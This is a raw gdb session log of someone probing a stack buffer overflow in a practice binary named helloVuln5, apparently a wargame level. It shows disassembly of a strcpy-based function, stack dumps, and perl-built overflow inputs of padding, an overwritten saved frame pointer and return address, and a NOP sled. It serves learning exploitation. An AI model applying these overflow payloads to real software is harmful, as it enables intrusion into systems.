0xbfbf8518:     0x8548  0xbfbf  0x873b  0x0804  0x9700  0xbfbf  0x03ee  0x0000
(gdb) x/16hx $ebp + 0x10
0xbfbf8528:     0x8548  0xbfbf  0x86f4  0x0804  0x0002  0x0000  0x85f4  0xbfbf
0xbfbf8538:     0x8600  0xbfbf  0x8888  0x0804  0x8560  0xbfbf  0x0000  0x0000
(gdb) x/16hx $ebp + 0xc
0xbfbf8524:     0x03ee  0x0000  0x8548  0xbfbf  0x86f4  0x0804  0x0002  0x0000
0xbfbf8534:     0x85f4  0xbfbf  0x8600  0xbfbf  0x8888  0x0804  0x8560  0xbfbf
(gdb) x/16hx $ebp - 0xc
0xbfbf850c:     0x4141  0x4141  0x0000  0x0000  0xfb66  0xb7e5  0x8548  0xbfbf
0xbfbf851c:     0x873b  0x0804  0x9700  0xbfbf  0x03ee  0x0000  0x8548  0xbfbf
(gdb) x/16hx $ebp - 0xc - 1
0xbfbf850b:     0x4141  0x4141  0x0041  0x0000  0x6600  0xe5fb  0x48b7  0xbf85
0xbfbf851b:     0x3bbf  0x0487  0x0008  0xbf97  0xeebf  0x0003  0x4800  0xbf85
(gdb) x/16hx $ebp - 0xc - 2
0xbfbf850a:     0x4141  0x4141  0x4141  0x0000  0x0000  0xfb66  0xb7e5  0x8548
0xbfbf851a:     0xbfbf  0x873b  0x0804  0x9700  0xbfbf  0x03ee  0x0000  0x8548
(gdb) x/16hx $ebp - 0xc - 4
0xbfbf8508:     0x4141  0x4141  0x4141  0x4141  0x0000  0x0000  0xfb66  0xb7e5
0xbfbf8518:     0x8548  0xbfbf  0x873b  0x0804  0x9700  0xbfbf  0x03ee  0x0000
(gdb) x/16hx $ebp - 0xc - 8
0xbfbf8504:     0x4141  0x4141  0x4141  0x4141  0x4141  0x4141  0x0000  0x0000
0xbfbf8514:     0xfb66  0xb7e5  0x8548  0xbfbf  0x873b  0x0804  0x9700  0xbfbf
(gdb) x/16hx $ebp - 0xc - 10
0xbfbf8502:     0x4141  0x4141  0x4141  0x4141  0x4141  0x4141  0x4141  0x0000
0xbfbf8512:     0x0000  0xfb66  0xb7e5  0x8548  0xbfbf  0x873b  0x0804  0x9700
(gdb) x/16hx $ebp - 0xc - 16
0xbfbf84fc:     0x4141  0x4141  0x4141  0x4141  0x4141  0x4141  0x4141  0x4141
0xbfbf850c:     0x4141  0x4141  0x0000  0x0000  0xfb66  0xb7e5  0x8548  0xbfbf
(gdb) x/124hx $ebp - 0xc - 16
0xbfbf84fc:     0x4141  0x4141  0x4141  0x4141  0x4141  0x4141  0x4141  0x4141
0xbfbf850c:     0x4141  0x4141  0x0000  0x0000  0xfb66  0xb7e5  0x8548  0xbfbf
0xbfbf851c:     0x873b  0x0804  0x9700  0xbfbf  0x03ee  0x0000  0x8548  0xbfbf
0xbfbf852c:     0x86f4  0x0804  0x0002  0x0000  0x85f4  0xbfbf  0x8600  0xbfbf
0xbfbf853c:     0x8888  0x0804  0x8560  0xbfbf  0x0000  0x0000  0x0000  0x0000
0xbfbf854c:     0x7f21  0xb7d8  0x7000  0xb7f4  0x7000  0xb7f4  0x0000  0x0000
0xbfbf855c:     0x7f21  0xb7d8  0x0002  0x0000  0x85f4  0xbfbf  0x8600  0xbfbf
0xbfbf856c:     0x8584  0xbfbf  0x0001  0x0000  0x0000  0x0000  0x7000  0xb7f4
0xbfbf857c:     0xa76a  0xb7f7  0x2000  0xb7f9  0x0000  0x0000  0x7000  0xb7f4
0xbfbf858c:     0x0000  0x0000  0x0000  0x0000  0x4b7b  0x7538  0x4d6b  0xbacf
0xbfbf859c:     0x0000  0x0000  0x0000  0x0000  0x0000  0x0000  0x0002  0x0000
0xbfbf85ac:     0x84e0  0x0804  0x0000  0x0000  0xfe30  0xb7f7  0xa9c0  0xb7f7
0xbfbf85bc:     0xa000  0x0804  0x0002  0x0000  0x84e0  0x0804  0x0000  0x0000
0xbfbf85cc:     0x8512  0x0804  0x86d4  0x0804  0x0002  0x0000  0x85f4  0xbfbf
0xbfbf85dc:     0x8750  0x0804  0x87b0  0x0804  0xa9c0  0xb7f7  0x85ec  0xbfbf
0xbfbf85ec:     0x2940  0xb7f9  0x0002  0x0000
(gdb) x/124hx $ebp - 0xc - 20
0xbfbf84f8:     0x7000  0xb7f4  0x4141  0x4141  0x4141  0x4141  0x4141  0x4141
0xbfbf8508:     0x4141  0x4141  0x4141  0x4141  0x0000  0x0000  0xfb66  0xb7e5
0xbfbf8518:     0x8548  0xbfbf  0x873b  0x0804  0x9700  0xbfbf  0x03ee  0x0000
0xbfbf8528:     0x8548  0xbfbf  0x86f4  0x0804  0x0002  0x0000  0x85f4  0xbfbf
0xbfbf8538:     0x8600  0xbfbf  0x8888  0x0804  0x8560  0xbfbf  0x0000  0x0000
0xbfbf8548:     0x0000  0x0000  0x7f21  0xb7d8  0x7000  0xb7f4  0x7000  0xb7f4
0xbfbf8558:     0x0000  0x0000  0x7f21  0xb7d8  0x0002  0x0000  0x85f4  0xbfbf
0xbfbf8568:     0x8600  0xbfbf  0x8584  0xbfbf  0x0001  0x0000  0x0000  0x0000
0xbfbf8578:     0x7000  0xb7f4  0xa76a  0xb7f7  0x2000  0xb7f9  0x0000  0x0000
0xbfbf8588:     0x7000  0xb7f4  0x0000  0x0000  0x0000  0x0000  0x4b7b  0x7538
0xbfbf8598:     0x4d6b  0xbacf  0x0000  0x0000  0x0000  0x0000  0x0000  0x0000
0xbfbf85a8:     0x0002  0x0000  0x84e0  0x0804  0x0000  0x0000  0xfe30  0xb7f7
0xbfbf85b8:     0xa9c0  0xb7f7  0xa000  0x0804  0x0002  0x0000  0x84e0  0x0804
0xbfbf85c8:     0x0000  0x0000  0x8512  0x0804  0x86d4  0x0804  0x0002  0x0000
0xbfbf85d8:     0x85f4  0xbfbf  0x8750  0x0804  0x87b0  0x0804  0xa9c0  0xb7f7
0xbfbf85e8:     0x85ec  0xbfbf  0x2940  0xb7f9
(gdb) r $(perl -e 'print "A"x20')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/level2/Desktop/helloVuln5 $(perl -e 'print "A"x20')

Breakpoint 1, 0x08048736 in main ()
1: environ = (char **) 0xbf913760
(gdb) cont
Continuing.

Breakpoint 2, 0x08048652 in vulnFunction ()
1: environ = (char **) 0xbf913760
(gdb) x/124hx $ebp - 0xc - 20
0xbf913688:     0x36a8  0xbf91  0x86f4  0x0804  0x0002  0x0000  0x3754  0xbf91
0xbf913698:     0x3760  0xbf91  0x8888  0x0804  0x36c0  0xbf91  0x0000  0x0000
0xbf9136a8:     0x0000  0x0000  0xcf21  0xb7de  0xc000  0xb7fa  0xc000  0xb7fa
0xbf9136b8:     0x0000  0x0000  0xcf21  0xb7de  0x0002  0x0000  0x3754  0xbf91
0xbf9136c8:     0x3760  0xbf91  0x36e4  0xbf91  0x0001  0x0000  0x0000  0x0000
0xbf9136d8:     0xc000  0xb7fa  0xf76a  0xb7fd  0x7000  0xb7ff  0x0000  0x0000
0xbf9136e8:     0xc000  0xb7fa  0x0000  0x0000  0x0000  0x0000  0x4d2b  0x273c
0xbf9136f8:     0x0b3b  0xb8cc  0x0000  0x0000  0x0000  0x0000  0x0000  0x0000
0xbf913708:     0x0002  0x0000  0x84e0  0x0804  0x0000  0x0000  0x4e30  0xb7fe
0xbf913718:     0xf9c0  0xb7fd  0xa000  0x0804  0x0002  0x0000  0x84e0  0x0804
0xbf913728:     0x0000  0x0000  0x8512  0x0804  0x86d4  0x0804  0x0002  0x0000
0xbf913738:     0x3754  0xbf91  0x8750  0x0804  0x87b0  0x0804  0xf9c0  0xb7fd
0xbf913748:     0x374c  0xbf91  0x7940  0xb7ff  0x0002  0x0000  0x46e0  0xbf91
0xbf913758:     0x4700  0xbf91  0x0000  0x0000  0x4715  0xbf91  0x4d01  0xbf91
0xbf913768:     0x4d35  0xbf91  0x4d57  0xbf91  0x4d66  0xbf91  0x4d77  0xbf91
0xbf913778:     0x4d8b  0xbf91  0x4d9e  0xbf91
(gdb) x/124hd $ebp - 0xc - 20
0xbf913688:     13992   -16495  -30988  2052    2       0       14164   -16495
0xbf913698:     14176   -16495  -30584  2052    14016   -16495  0       0
0xbf9136a8:     0       0       -12511  -18466  -16384  -18438  -16384  -18438
0xbf9136b8:     0       0       -12511  -18466  2       0       14164   -16495
0xbf9136c8:     14176   -16495  14052   -16495  1       0       0       0
0xbf9136d8:     -16384  -18438  -2198   -18435  28672   -18433  0       0
0xbf9136e8:     -16384  -18438  0       0       0       0       19755   10044
0xbf9136f8:     2875    -18228  0       0       0       0       0       0
0xbf913708:     2       0       -31520  2052    0       0       20016   -18434
0xbf913718:     -1600   -18435  -24576  2052    2       0       -31520  2052
0xbf913728:     0       0       -31470  2052    -31020  2052    2       0
0xbf913738:     14164   -16495  -30896  2052    -30800  2052    -1600   -18435
0xbf913748:     14156   -16495  31040   -18433  2       0       18144   -16495
0xbf913758:     18176   -16495  0       0       18197   -16495  19713   -16495
0xbf913768:     19765   -16495  19799   -16495  19814   -16495  19831   -16495
0xbf913778:     19851   -16495  19870   -16495
(gdb) x/124hx $ebp - 0xc - 20
0xbf913688:     0x36a8  0xbf91  0x86f4  0x0804  0x0002  0x0000  0x3754  0xbf91
0xbf913698:     0x3760  0xbf91  0x8888  0x0804  0x36c0  0xbf91  0x0000  0x0000
0xbf9136a8:     0x0000  0x0000  0xcf21  0xb7de  0xc000  0xb7fa  0xc000  0xb7fa
0xbf9136b8:     0x0000  0x0000  0xcf21  0xb7de  0x0002  0x0000  0x3754  0xbf91
0xbf9136c8:     0x3760  0xbf91  0x36e4  0xbf91  0x0001  0x0000  0x0000  0x0000
0xbf9136d8:     0xc000  0xb7fa  0xf76a  0xb7fd  0x7000  0xb7ff  0x0000  0x0000
0xbf9136e8:     0xc000  0xb7fa  0x0000  0x0000  0x0000  0x0000  0x4d2b  0x273c
0xbf9136f8:     0x0b3b  0xb8cc  0x0000  0x0000  0x0000  0x0000  0x0000  0x0000
0xbf913708:     0x0002  0x0000  0x84e0  0x0804  0x0000  0x0000  0x4e30  0xb7fe
0xbf913718:     0xf9c0  0xb7fd  0xa000  0x0804  0x0002  0x0000  0x84e0  0x0804
0xbf913728:     0x0000  0x0000  0x8512  0x0804  0x86d4  0x0804  0x0002  0x0000
0xbf913738:     0x3754  0xbf91  0x8750  0x0804  0x87b0  0x0804  0xf9c0  0xb7fd
0xbf913748:     0x374c  0xbf91  0x7940  0xb7ff  0x0002  0x0000  0x46e0  0xbf91
0xbf913758:     0x4700  0xbf91  0x0000  0x0000  0x4715  0xbf91  0x4d01  0xbf91
0xbf913768:     0x4d35  0xbf91  0x4d57  0xbf91  0x4d66  0xbf91  0x4d77  0xbf91
0xbf913778:     0x4d8b  0xbf91  0x4d9e  0xbf91
(gdb) disass vulnFunction 
Dump of assembler code for function vulnFunction:
   0x08048651 <+0>:     push   %ebp
=> 0x08048652 <+1>:     mov    %esp,%ebp
   0x08048654 <+3>:     sub    $0x28,%esp
   0x08048657 <+6>:     movl   $0x0,-0x1c(%ebp)
   0x0804865e <+13>:    movl   $0x0,-0x18(%ebp)
   0x08048665 <+20>:    movl   $0x0,-0x14(%ebp)
   0x0804866c <+27>:    movl   $0x0,-0x10(%ebp)
   0x08048673 <+34>:    movl   $0x28,-0xc(%ebp)
   0x0804867a <+41>:    sub    $0xc,%esp
   0x0804867d <+44>:    pushl  0x8(%ebp)
   0x08048680 <+47>:    call   0x80484b0 <strlen@plt>
   0x08048685 <+52>:    add    $0x10,%esp
   0x08048688 <+55>:    mov    %eax,%edx
   0x0804868a <+57>:    mov    -0xc(%ebp),%eax
   0x0804868d <+60>:    cmp    %eax,%edx
   0x0804868f <+62>:    jb     0x80486ab <vulnFunction+90>
   0x08048691 <+64>:    sub    $0xc,%esp
   0x08048694 <+67>:    push   $0x8048854
   0x08048699 <+72>:    call   0x8048470 <puts@plt>
   0x0804869e <+77>:    add    $0x10,%esp
   0x080486a1 <+80>:    sub    $0xc,%esp
   0x080486a4 <+83>:    push   $0x0
   0x080486a6 <+85>:    call   0x8048480 <exit@plt>
   0x080486ab <+90>:    sub    $0x8,%esp
   0x080486ae <+93>:    pushl  0x8(%ebp)
   0x080486b1 <+96>:    lea    -0x1c(%ebp),%eax
   0x080486b4 <+99>:    push   %eax
   0x080486b5 <+100>:   call   0x8048460 <strcpy@plt>
   0x080486ba <+105>:   add    $0x10,%esp
   0x080486bd <+108>:   sub    $0x8,%esp
   0x080486c0 <+111>:   lea    -0x1c(%ebp),%eax
   0x080486c3 <+114>:   push   %eax
   0x080486c4 <+115>:   push   $0x804887a
   0x080486c9 <+120>:   call   0x8048430 <printf@plt>
   0x080486ce <+125>:   add    $0x10,%esp
   0x080486d1 <+128>:   nop
   0x080486d2 <+129>:   leave  
   0x080486d3 <+130>:   ret    
End of assembler dump.
(gdb) b *0x0804867a
Breakpoint 4 at 0x804867a
(gdb) cont
Continuing.

Breakpoint 4, 0x0804867a in vulnFunction ()
1: environ = (char **) 0xbf913760
(gdb) b *0x0804867a
Note: breakpoint 4 also set at pc 0x804867a.
Breakpoint 5 at 0x804867a
(gdb) x/124hx $ebp - 0xc - 20
0xbf913658:     0xc000  0xb7fa  0x0000  0x0000  0x0000  0x0000  0x0000  0x0000
0xbf913668:     0x0000  0x0000  0x0028  0x0000  0x0000  0x0000  0x4b66  0xb7ec
0xbf913678:     0x36a8  0xbf91  0x873b  0x0804  0x4700  0xbf91  0x03ee  0x0000
0xbf913688:     0x36a8  0xbf91  0x86f4  0x0804  0x0002  0x0000  0x3754  0xbf91
0xbf913698:     0x3760  0xbf91  0x8888  0x0804  0x36c0  0xbf91  0x0000  0x0000
0xbf9136a8:     0x0000  0x0000  0xcf21  0xb7de  0xc000  0xb7fa  0xc000  0xb7fa
0xbf9136b8:     0x0000  0x0000  0xcf21  0xb7de  0x0002  0x0000  0x3754  0xbf91
0xbf9136c8:     0x3760  0xbf91  0x36e4  0xbf91  0x0001  0x0000  0x0000  0x0000
0xbf9136d8:     0xc000  0xb7fa  0xf76a  0xb7fd  0x7000  0xb7ff  0x0000  0x0000
0xbf9136e8:     0xc000  0xb7fa  0x0000  0x0000  0x0000  0x0000  0x4d2b  0x273c
0xbf9136f8:     0x0b3b  0xb8cc  0x0000  0x0000  0x0000  0x0000  0x0000  0x0000
0xbf913708:     0x0002  0x0000  0x84e0  0x0804  0x0000  0x0000  0x4e30  0xb7fe
0xbf913718:     0xf9c0  0xb7fd  0xa000  0x0804  0x0002  0x0000  0x84e0  0x0804
0xbf913728:     0x0000  0x0000  0x8512  0x0804  0x86d4  0x0804  0x0002  0x0000
0xbf913738:     0x3754  0xbf91  0x8750  0x0804  0x87b0  0x0804  0xf9c0  0xb7fd
0xbf913748:     0x374c  0xbf91  0x7940  0xb7ff
(gdb) x/124wx $ebp - 0xc - 20
0xbf913658:     0xb7fac000      0x00000000      0x00000000      0x00000000
0xbf913668:     0x00000000      0x00000028      0x00000000      0xb7ec4b66
0xbf913678:     0xbf9136a8      0x0804873b      0xbf914700      0x000003ee
0xbf913688:     0xbf9136a8      0x080486f4      0x00000002      0xbf913754
0xbf913698:     0xbf913760      0x08048888      0xbf9136c0      0x00000000
0xbf9136a8:     0x00000000      0xb7decf21      0xb7fac000      0xb7fac000
0xbf9136b8:     0x00000000      0xb7decf21      0x00000002      0xbf913754
0xbf9136c8:     0xbf913760      0xbf9136e4      0x00000001      0x00000000
0xbf9136d8:     0xb7fac000      0xb7fdf76a      0xb7ff7000      0x00000000
0xbf9136e8:     0xb7fac000      0x00000000      0x00000000      0x273c4d2b
0xbf9136f8:     0xb8cc0b3b      0x00000000      0x00000000      0x00000000
0xbf913708:     0x00000002      0x080484e0      0x00000000      0xb7fe4e30
0xbf913718:     0xb7fdf9c0      0x0804a000      0x00000002      0x080484e0
0xbf913728:     0x00000000      0x08048512      0x080486d4      0x00000002
0xbf913738:     0xbf913754      0x08048750      0x080487b0      0xb7fdf9c0
0xbf913748:     0xbf91374c      0xb7ff7940      0x00000002      0xbf9146e0
0xbf913758:     0xbf914700      0x00000000      0xbf914715      0xbf914d01
0xbf913768:     0xbf914d35      0xbf914d57      0xbf914d66      0xbf914d77
0xbf913778:     0xbf914d8b      0xbf914d9e      0xbf914daa      0xbf914dcc
0xbf913788:     0xbf914ded      0xbf914e06      0xbf914e18      0xbf914e3a
0xbf913798:     0xbf914e7b      0xbf914e8e      0xbf914ea4      0xbf914eb4
0xbf9137a8:     0xbf914ebf      0xbf914ec7      0xbf914ed6      0xbf914f0c
0xbf9137b8:     0xbf914f2b      0xbf914fbc      0x00000000      0x00000020
0xbf9137c8:     0xb7fced00      0x00000021      0xb7fce000      0x00000010
0xbf9137d8:     0x1f8bfbff      0x00000006      0x00001000      0x00000011
0xbf9137e8:     0x00000064      0x00000003      0x08048034      0x00000004
0xbf9137f8:     0x00000020      0x00000005      0x00000009      0x00000007
0xbf913808:     0xb7fd0000      0x00000008      0x00000000      0x00000009
0xbf913818:     0x080484e0      0x0000000b      0x000003ec      0x0000000c
0xbf913828:     0x000003ec      0x0000000d      0x000003ec      0x0000000e
0xbf913838:     0x000003ec      0x00000017      0x00000001      0x00000019
(gdb) r $(perl -e 'print "A"x24 . "\xef\xef\xef\xef" .   "\xb4\x9d\xbf\xbf" . "\x90"x100')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/level2/Desktop/helloVuln5 $(perl -e 'print "A"x24 . "\xef\xef\xef\xef" .   "\xb4\x9d\xbf\xbf" . "\x90"x100')

Breakpoint 1, 0x08048736 in main ()
1: environ = (char **) 0xbfdfbd60
(gdb) cont
Continuing.

Breakpoint 2, 0x08048652 in vulnFunction ()
1: environ = (char **) 0xbfdfbd60
(gdb) cont
Continuing.

Breakpoint 4, 0x0804867a in vulnFunction ()
1: environ = (char **) 0xbfdfbd60
(gdb) x/124wx $ebp - 0xc - 20
0xbfdfbc58:     0xb7f6f000      0x00000000      0x00000000      0x00000000
0xbfdfbc68:     0x00000000      0x00000028      0x00000000      0xb7e87b66
0xbfdfbc78:     0xbfdfbca8      0x0804873b      0xbfdfd690      0x000003ee
0xbfdfbc88:     0xbfdfbca8      0x080486f4      0x00000002      0xbfdfbd54
0xbfdfbc98:     0xbfdfbd60      0x08048888      0xbfdfbcc0      0x00000000
0xbfdfbca8:     0x00000000      0xb7daff21      0xb7f6f000      0xb7f6f000
0xbfdfbcb8:     0x00000000      0xb7daff21      0x00000002      0xbfdfbd54
0xbfdfbcc8:     0xbfdfbd60      0xbfdfbce4      0x00000001      0x00000000
0xbfdfbcd8:     0xb7f6f000      0xb7fa276a      0xb7fba000      0x00000000
0xbfdfbce8:     0xb7f6f000      0x00000000      0x00000000      0xfa6e681a
0xbfdfbcf8:     0xf0ea2e0a      0x00000000      0x00000000      0x00000000
0xbfdfbd08:     0x00000002      0x080484e0      0x00000000      0xb7fa7e30
0xbfdfbd18:     0xb7fa29c0      0x0804a000      0x00000002      0x080484e0
0xbfdfbd28:     0x00000000      0x08048512      0x080486d4      0x00000002
0xbfdfbd38:     0xbfdfbd54      0x08048750      0x080487b0      0xb7fa29c0
0xbfdfbd48:     0xbfdfbd4c      0xb7fba940      0x00000002      0xbfdfd670
0xbfdfbd58:     0xbfdfd690      0x00000000      0xbfdfd715      0xbfdfdd01
0xbfdfbd68:     0xbfdfdd35      0xbfdfdd57      0xbfdfdd66      0xbfdfdd77
0xbfdfbd78:     0xbfdfdd8b      0xbfdfdd9e      0xbfdfddaa      0xbfdfddcc
0xbfdfbd88:     0xbfdfdded      0xbfdfde06      0xbfdfde18      0xbfdfde3a
0xbfdfbd98:     0xbfdfde7b      0xbfdfde8e      0xbfdfdea4      0xbfdfdeb4
0xbfdfbda8:     0xbfdfdebf      0xbfdfdec7      0xbfdfded6      0xbfdfdf0c
0xbfdfbdb8:     0xbfdfdf2b      0xbfdfdfbc      0x00000000      0x00000020
0xbfdfbdc8:     0xb7f91d00      0x00000021      0xb7f91000      0x00000010
0xbfdfbdd8:     0x1f8bfbff      0x00000006      0x00001000      0x00000011
0xbfdfbde8:     0x00000064      0x00000003      0x08048034      0x00000004
0xbfdfbdf8:     0x00000020      0x00000005      0x00000009      0x00000007
0xbfdfbe08:     0xb7f93000      0x00000008      0x00000000      0x00000009
0xbfdfbe18:     0x080484e0      0x0000000b      0x000003ec      0x0000000c
0xbfdfbe28:     0x000003ec      0x0000000d      0x000003ec      0x0000000e
0xbfdfbe38:     0x000003ec      0x00000017      0x00000001      0x00000019
(gdb) cont
Continuing.
Input too large!
Program terminated.

[Inferior 1 (process 27847) exited normally]
(gdb) r $(perl -e 'print "A"x20 . "\xef\xef\xef\xef" .   "\xb4\x9d\xbf\xbf")
Starting program: /home/level2/Desktop/helloVuln5 $(perl -e 'print "A"x20 . "\xef\xef\xef\xef" .   "\xb4\x9d\xbf\xbf")
/bin/bash: -c: line 0: unexpected EOF while looking for matching `''
/bin/bash: -c: line 1: syntax error: unexpected end of file
During startup program exited with code 1.
(gdb) r $(perl -e 'print "A"x20 . "\xef\xef\xef\xef" .   "\xb4\x9d\xbf\xbf"')
Starting program: /home/level2/Desktop/helloVuln5 $(perl -e 'print "A"x20 . "\xef\xef\xef\xef" .   "\xb4\x9d\xbf\xbf"')

Breakpoint 1, 0x08048736 in main ()
1: environ = (char **) 0xbfbd03b0
(gdb) cont
Continuing.

Breakpoint 2, 0x08048652 in vulnFunction ()
1: environ = (char **) 0xbfbd03b0
(gdb) cont
Continuing.

Breakpoint 4, 0x0804867a in vulnFunction ()
1: environ = (char **) 0xbfbd03b0
(gdb) x/124wx $ebp - 0xc - 20
0xbfbd02a8:     0xb7f14000      0x00000000      0x00000000      0x00000000
0xbfbd02b8:     0x00000000      0x00000028      0x00000000      0xb7e2cb66
0xbfbd02c8:     0xbfbd02f8      0x0804873b      0xbfbd06f8      0x000003ee
0xbfbd02d8:     0xbfbd02f8      0x080486f4      0x00000002      0xbfbd03a4
0xbfbd02e8:     0xbfbd03b0      0x08048888      0xbfbd0310      0x00000000
0xbfbd02f8:     0x00000000      0xb7d54f21      0xb7f14000      0xb7f14000
0xbfbd0308:     0x00000000      0xb7d54f21      0x00000002      0xbfbd03a4
0xbfbd0318:     0xbfbd03b0      0xbfbd0334      0x00000001      0x00000000
0xbfbd0328:     0xb7f14000      0xb7f4776a      0xb7f5f000      0x00000000
0xbfbd0338:     0xb7f14000      0x00000000      0x00000000      0x67954a68
0xbfbd0348:     0xb70eac78      0x00000000      0x00000000      0x00000000
0xbfbd0358:     0x00000002      0x080484e0      0x00000000      0xb7f4ce30
0xbfbd0368:     0xb7f479c0      0x0804a000      0x00000002      0x080484e0
0xbfbd0378:     0x00000000      0x08048512      0x080486d4      0x00000002
0xbfbd0388:     0xbfbd03a4      0x08048750      0x080487b0      0xb7f479c0
0xbfbd0398:     0xbfbd039c      0xb7f5f940      0x00000002      0xbfbd06d8
0xbfbd03a8:     0xbfbd06f8      0x00000000      0xbfbd0715      0xbfbd0d01
0xbfbd03b8:     0xbfbd0d35      0xbfbd0d57      0xbfbd0d66      0xbfbd0d77
0xbfbd03c8:     0xbfbd0d8b      0xbfbd0d9e      0xbfbd0daa      0xbfbd0dcc
0xbfbd03d8:     0xbfbd0ded      0xbfbd0e06      0xbfbd0e18      0xbfbd0e3a
0xbfbd03e8:     0xbfbd0e7b      0xbfbd0e8e      0xbfbd0ea4      0xbfbd0eb4
0xbfbd03f8:     0xbfbd0ebf      0xbfbd0ec7      0xbfbd0ed6      0xbfbd0f0c
0xbfbd0408:     0xbfbd0f2b      0xbfbd0fbc      0x00000000      0x00000020
0xbfbd0418:     0xb7f36d00      0x00000021      0xb7f36000      0x00000010
0xbfbd0428:     0x1f8bfbff      0x00000006      0x00001000      0x00000011
0xbfbd0438:     0x00000064      0x00000003      0x08048034      0x00000004
0xbfbd0448:     0x00000020      0x00000005      0x00000009      0x00000007
0xbfbd0458:     0xb7f38000      0x00000008      0x00000000      0x00000009
0xbfbd0468:     0x080484e0      0x0000000b      0x000003ec      0x0000000c
0xbfbd0478:     0x000003ec      0x0000000d      0x000003ec      0x0000000e
0xbfbd0488:     0x000003ec      0x00000017      0x00000001      0x00000019
(gdb) disass vulnFunction 
Dump of assembler code for function vulnFunction:
   0x08048651 <+0>:     push   %ebp
   0x08048652 <+1>:     mov    %esp,%ebp
   0x08048654 <+3>:     sub    $0x28,%esp
   0x08048657 <+6>:     movl   $0x0,-0x1c(%ebp)
   0x0804865e <+13>:    movl   $0x0,-0x18(%ebp)
   0x08048665 <+20>:    movl   $0x0,-0x14(%ebp)
   0x0804866c <+27>:    movl   $0x0,-0x10(%ebp)
   0x08048673 <+34>:    movl   $0x28,-0xc(%ebp)
=> 0x0804867a <+41>:    sub    $0xc,%esp
   0x0804867d <+44>:    pushl  0x8(%ebp)
   0x08048680 <+47>:    call   0x80484b0 <strlen@plt>
   0x08048685 <+52>:    add    $0x10,%esp
   0x08048688 <+55>:    mov    %eax,%edx
   0x0804868a <+57>:    mov    -0xc(%ebp),%eax
   0x0804868d <+60>:    cmp    %eax,%edx
   0x0804868f <+62>:    jb     0x80486ab <vulnFunction+90>
   0x08048691 <+64>:    sub    $0xc,%esp
   0x08048694 <+67>:    push   $0x8048854
   0x08048699 <+72>:    call   0x8048470 <puts@plt>
   0x0804869e <+77>:    add    $0x10,%esp
   0x080486a1 <+80>:    sub    $0xc,%esp
   0x080486a4 <+83>:    push   $0x0
   0x080486a6 <+85>:    call   0x8048480 <exit@plt>
   0x080486ab <+90>:    sub    $0x8,%esp
   0x080486ae <+93>:    pushl  0x8(%ebp)
   0x080486b1 <+96>:    lea    -0x1c(%ebp),%eax
   0x080486b4 <+99>:    push   %eax
   0x080486b5 <+100>:   call   0x8048460 <strcpy@plt>
   0x080486ba <+105>:   add    $0x10,%esp
   0x080486bd <+108>:   sub    $0x8,%esp
   0x080486c0 <+111>:   lea    -0x1c(%ebp),%eax
   0x080486c3 <+114>:   push   %eax
   0x080486c4 <+115>:   push   $0x804887a
   0x080486c9 <+120>:   call   0x8048430 <printf@plt>
   0x080486ce <+125>:   add    $0x10,%esp
   0x080486d1 <+128>:   nop
   0x080486d2 <+129>:   leave  
   0x080486d3 <+130>:   ret    
End of assembler dump.
(gdb) cont
Continuing.

Breakpoint 3, 0x080486ba in vulnFunction ()
1: environ = (char **) 0xbfbd03b0
(gdb) x/124wx $ebp - 0xc - 20
0xbfbd02a8:     0xb7f14000      0x41414141      0x41414141      0x41414141
0xbfbd02b8:     0x41414141      0x41414141      0xefefefef      0xbfbf9db4
0xbfbd02c8:     0xbfbd0200      0x0804873b      0xbfbd06f8      0x000003ee
0xbfbd02d8:     0xbfbd02f8      0x080486f4      0x00000002      0xbfbd03a4
0xbfbd02e8:     0xbfbd03b0      0x08048888      0xbfbd0310      0x00000000
0xbfbd02f8:     0x00000000      0xb7d54f21      0xb7f14000      0xb7f14000
0xbfbd0308:     0x00000000      0xb7d54f21      0x00000002      0xbfbd03a4
0xbfbd0318:     0xbfbd03b0      0xbfbd0334      0x00000001      0x00000000
0xbfbd0328:     0xb7f14000      0xb7f4776a      0xb7f5f000      0x00000000
0xbfbd0338:     0xb7f14000      0x00000000      0x00000000      0x67954a68
0xbfbd0348:     0xb70eac78      0x00000000      0x00000000      0x00000000
0xbfbd0358:     0x00000002      0x080484e0      0x00000000      0xb7f4ce30
0xbfbd0368:     0xb7f479c0      0x0804a000      0x00000002      0x080484e0
0xbfbd0378:     0x00000000      0x08048512      0x080486d4      0x00000002
0xbfbd0388:     0xbfbd03a4      0x08048750      0x080487b0      0xb7f479c0
0xbfbd0398:     0xbfbd039c      0xb7f5f940      0x00000002      0xbfbd06d8
0xbfbd03a8:     0xbfbd06f8      0x00000000      0xbfbd0715      0xbfbd0d01
0xbfbd03b8:     0xbfbd0d35      0xbfbd0d57      0xbfbd0d66      0xbfbd0d77
0xbfbd03c8:     0xbfbd0d8b      0xbfbd0d9e      0xbfbd0daa      0xbfbd0dcc
0xbfbd03d8:     0xbfbd0ded      0xbfbd0e06      0xbfbd0e18      0xbfbd0e3a
0xbfbd03e8:     0xbfbd0e7b      0xbfbd0e8e      0xbfbd0ea4      0xbfbd0eb4
0xbfbd03f8:     0xbfbd0ebf      0xbfbd0ec7      0xbfbd0ed6      0xbfbd0f0c
0xbfbd0408:     0xbfbd0f2b      0xbfbd0fbc      0x00000000      0x00000020
0xbfbd0418:     0xb7f36d00      0x00000021      0xb7f36000      0x00000010
0xbfbd0428:     0x1f8bfbff      0x00000006      0x00001000      0x00000011
0xbfbd0438:     0x00000064      0x00000003      0x08048034      0x00000004
0xbfbd0448:     0x00000020      0x00000005      0x00000009      0x00000007
0xbfbd0458:     0xb7f38000      0x00000008      0x00000000      0x00000009
0xbfbd0468:     0x080484e0      0x0000000b      0x000003ec      0x0000000c
0xbfbd0478:     0x000003ec      0x0000000d      0x000003ec      0x0000000e
0xbfbd0488:     0x000003ec      0x00000017      0x00000001      0x00000019
(gdb) r $(perl -e 'print "A"x22 . "\xef\xef\xef\xef" .   "\xb4\x9d\xbf\xbf"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/level2/Desktop/helloVuln5 $(perl -e 'print "A"x22 . "\xef\xef\xef\xef" .   "\xb4\x9d\xbf\xbf"')

Breakpoint 1, 0x08048736 in main ()
1: environ = (char **) 0xbfb7cf10
(gdb) cont
Continuing.

Breakpoint 2, 0x08048652 in vulnFunction ()
1: environ = (char **) 0xbfb7cf10
(gdb) cont
Continuing.

Breakpoint 4, 0x0804867a in vulnFunction ()
1: environ = (char **) 0xbfb7cf10
(gdb) r $(perl -e 'print "A"x22 . "\xef\xef\xef\xef" .   "\xb4\x9d\xbf\xbf"')
